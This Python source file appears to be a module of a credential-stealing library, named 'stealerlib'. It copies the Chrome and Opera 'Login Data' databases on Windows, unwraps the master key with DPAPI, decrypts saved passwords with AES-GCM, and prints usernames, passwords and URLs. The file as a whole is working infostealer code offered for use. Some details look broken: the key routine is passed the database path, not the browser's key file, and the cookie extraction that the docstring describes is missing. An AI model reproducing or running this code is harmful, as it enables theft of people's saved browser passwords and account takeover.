#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/chromium.py
"""

from stealerlib.browser import *


class Chromium:
    """This class provides methods for extracting and decrypting cookies and passwords from Chromium based Web Browser databases

    Attributes:
        cookies         A list of (host, cookie_name, cookie_value, created, last_accessed, expires) tuples for each saved cookie
        passwords       A list of (username, password, url, created, last_used) tuples for each saved password

        opera_path      Path to Opera (GX)'s base directory
        chrome_path     Path to Google Chrome's base directory

        key             Encryption key to be used when handling encrypted values in the browsers database
    """

    def __init__(self):
        self.cookies = []
        self.passwords = []

        self.opera_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
        self.opera_installed = os.path.exists(self.opera_path)

        self.chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        self.chrome_installed = os.path.exists(self.chrome_path)

    @staticmethod
    def get_datetime(time_ms: int) -> Union[str, int]:
        """Return a formatted `datetime.datetime` object from a chrome format datetime (in ms)

        Parameters:
            time_ms (int): The amount of milliseconds we need to convert to a datetime object

        Returns:
            Union[datetime, int]: returns time_ms or the datetime object formatted using strftime
        """

        if time_ms != 86400000000 and time_ms:
            try:
                dt = datetime(1601, 1, 1) + timedelta(microseconds=time_ms)
                return dt.strftime("%m/%d/%Y, %H:%M:%S")
            except:
                return time_ms
        else:
            return ""

    @catch
    def get_encryption_key(self, path: str) -> bytes:
        """Retrieves the master encryption key used to encrypt the user's data

        Parameters:
            self (object): The object passed to the method

        Returns:
            bytes: The encryption key we'll use to decrypt the user's passwords
        """

        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    @catch
    def decrypt_password(self, password: str) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            self (object): The object passed to the method
            password (str): The encrypted password to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        try:
            vector = password[3:15]
            password = password[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, vector)

            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    @catch
    def get_passwords_chromium(self) -> list[tuple[str, ...]]:
        """Retrieves the username and password from the Chrome browser by connecting to the Chrome database file -
           and decrypting the passwords using the encryption key

        Parameters:
            self (object): The object passed to the method

        Returns:
            list[tuple[str, ...]]: list of (username, password, url, created, last_used) tuples 

        Example:
            browser = Browser()
            browser.get_passwords_chromium()
        """

        if not self.chrome_installed:
            return self.passwords.append([])

        select_query = """
        SELECT origin_url, username_value, password_value, date_created, date_last_used
        FROM logins order by date_created"""

        with tempfile.TemporaryDirectory() as tmpdir:
            self.key = self.get_encryption_key(self.chrome_path)

            chrome_temp_db = "{}\ChromeData.db".format(tmpdir)
            shutil.copyfile(self.chrome_path, chrome_temp_db)

            db = sqlite3.connect(chrome_temp_db)
            cursor = db.cursor()
            cursor.execute(select_query)

            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, date_last_used = row

                password = self.decrypt_password(encrypted_password)
                date_created = self.get_datetime(date_created)
                date_last_used = self.get_datetime(date_last_used)

                if username or password:
                    self.passwords.append((username, password, origin_url, date_created, date_last_used))
                else:
                    continue

            cursor.close()
            db.close()
            os.remove(chrome_temp_db)

        return self.passwords

    @catch
    def get_passwords_opera(self) -> list[tuple[str, ...]]:
        """Retrieves the username and password from the Chrome browser by connecting to the Chrome database file -
           and decrypting the passwords using the encryption key

        Parameters:
            self (object): The object passed to the method

        Returns:
            list[tuple[str, ...]]: list of (username, password, url, created, last_used) tuples 

        Example:
            browser = Browser()
            browser.get_passwords_opera()
        """

        if not self.opera_installed:
            return self.passwords.append([])

        select_query = """
        SELECT origin_url, username_value, password_value, date_created, date_last_used
        FROM logins order by date_created"""

        with tempfile.TemporaryDirectory() as tmpdir:
            self.key = self.get_encryption_key(self.opera_path)

            opera_temp_db = "{}\OperaData.db".format(tmpdir)
            shutil.copyfile(self.opera_path, opera_temp_db)

            db = sqlite3.connect(opera_temp_db)
            cursor = db.cursor()
            cursor.execute(select_query)

            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, date_last_used = row

                password = self.decrypt_password(encrypted_password)
                date_created = self.get_datetime(date_created)
                date_last_used = self.get_datetime(date_last_used)

                if username or password:
                    self.passwords.append((username, password, origin_url, date_created, date_last_used))
                else:
                    continue

            cursor.close()
            db.close()
            os.remove(opera_temp_db)

        return self.passwords


if __name__ == '__main__':
    browser = Chromium()
    browser.get_passwords_chromium()
    browser.get_passwords_opera()
    print(browser.passwords)